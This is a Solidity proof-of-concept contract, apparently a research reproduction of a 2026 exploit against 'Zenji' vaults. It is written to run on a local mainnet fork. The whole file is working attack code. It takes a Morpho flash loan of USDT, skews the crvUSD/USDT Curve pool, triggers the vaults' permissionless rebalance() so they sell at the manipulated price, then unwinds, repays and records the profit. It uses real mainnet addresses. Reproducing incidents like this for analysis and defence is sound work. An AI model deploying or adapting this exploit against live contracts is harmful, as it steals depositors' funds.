// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

/// @dev Mainnet USDT's approve/transfer return NO data (Tether is not ERC-20 return-compliant),
///      so this interface deliberately declares no return values. Declaring `returns (bool)`
///      makes Solidity 0.8 revert on the empty returndata — that was a real bug in the first
///      version of this PoC and is worth recording.
interface IERC20 {
    function approve(address, uint256) external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external;
    function decimals() external view returns (uint8);
}

/// @dev Curve StableNG legacy entry point used by the Zenji attacker (selector 0x3df02124).
interface ICurveStableNg {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external returns (uint256);
    function get_virtual_price() external view returns (uint256);
    function balances(uint256 i) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IMorpho {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IZenjiVault {
    function rebalance() external;
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function asset() external view returns (address);
    function depositsPaused() external view returns (bool);
    function emergencyMode() external view returns (bool);
}

/// @title ZenjiAttacker
/// @notice Reproduces the 2026-11-08 Zenji recipe in one atomic transaction:
///         flash-borrow USDT -> buy crvUSD in the crvUSD/USDT StableNG pool ->
///         poke the vault's permissionless rebalance() so the vault exits its
///         crvUSD LP at the manipulated mark -> sell crvUSD back -> repay.
/// @dev    Read-only research artifact: runs only on a local anvil fork.
contract ZenjiAttacker {
    IERC20 internal constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 internal constant CRVUSD = IERC20(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E);
    ICurveStableNg internal constant POOL =
        ICurveStableNg(0x390f3595bCa2Df7d23783dFd126427CCeb997BF4);
    IMorpho internal constant MORPHO = IMorpho(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);

    address public immutable vaultA;
    address public immutable vaultB;

    bool public doRebalance;
    bool public rebalanceAOk;
    bool public rebalanceBOk;
    bytes public rebalanceAErr;
    bytes public rebalanceBErr;

    uint256 public borrowed;
    uint256 public startBal;
    /// @dev signed net for seeded runs (the attacker is pre-funded so the flash loan always repays)
    int256 public pnl;
    uint256 public crvBought;
    uint256 public usdtAfterBuy;
    uint256 public crvSold;
    uint256 public usdtFinal;
    uint256 public profit;

    constructor(address _vaultA, address _vaultB) {
        vaultA = _vaultA;
        vaultB = _vaultB;
    }

    function setDoRebalance(bool v) external {
        doRebalance = v;
    }

    /// @notice Entry point. Any USDT already held is treated as the attacker's own float, so the
    ///         same function supports an unfunded run (historical repro) and a seeded run (latent
    ///         measurement where the flash loan must always repay).
    function attack(uint256 amount) external {
        startBal = USDT.balanceOf(address(this));
        borrowed = amount;
        MORPHO.flashLoan(address(USDT), amount, "");
        usdtFinal = USDT.balanceOf(address(this));
        pnl = int256(usdtFinal) - int256(startBal);
        profit = usdtFinal > startBal ? usdtFinal - startBal : 0;
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == address(MORPHO), "not morpho");

        // 1) skew: USDT -> crvUSD (coin0 -> coin1)
        USDT.approve(address(POOL), assets);
        crvBought = POOL.exchange(0, 1, assets, 0);
        usdtAfterBuy = USDT.balanceOf(address(this));

        // 2) poke the permissionless keeper path while the pool is skewed
        if (doRebalance) {
            try IZenjiVault(vaultA).rebalance() {
                rebalanceAOk = true;
            } catch (bytes memory e) {
                rebalanceAErr = e;
            }
            try IZenjiVault(vaultB).rebalance() {
                rebalanceBOk = true;
            } catch (bytes memory e) {
                rebalanceBErr = e;
            }
        }

        // 3) unwind: crvUSD -> USDT
        crvSold = CRVUSD.balanceOf(address(this));
        CRVUSD.approve(address(POOL), crvSold);
        POOL.exchange(1, 0, crvSold, 0);

        // 4) repay the flash loan (Morpho pulls `assets` after the callback)
        USDT.approve(address(MORPHO), assets);
    }
}
